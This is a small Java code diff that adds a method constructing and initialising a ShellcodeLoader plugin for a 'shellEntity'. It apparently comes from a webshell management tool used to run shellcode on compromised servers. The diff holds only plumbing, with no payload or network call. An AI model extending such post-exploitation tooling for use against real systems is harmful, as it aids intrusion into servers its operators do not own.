@@ -14,4 +14,15 @@ public class NewCmd extends shells.plugins.generic.NewCmd {
     protected ShellcodeLoader getShellcodeLoader() {
         return (ShellcodeLoader) this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
     }
+
+    @Override
+    protected ShellcodeLoader createLoader() {
+        try {
+            ShellcodeLoader loader = new shells.plugins.java.ShellcodeLoader();
+            loader.init(this.shellEntity);
+            return loader;
+        } catch (Throwable t) {
+            return null;
+        }
+    }
 }
